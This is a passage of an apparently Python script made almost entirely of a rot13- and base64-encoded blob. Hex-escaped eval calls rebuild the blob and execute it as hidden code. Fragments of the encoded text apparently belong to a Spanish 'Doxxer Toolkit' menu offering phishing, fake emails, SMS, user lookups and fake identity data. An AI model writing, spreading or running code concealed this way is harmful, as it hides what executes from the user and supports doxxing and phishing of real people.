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'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
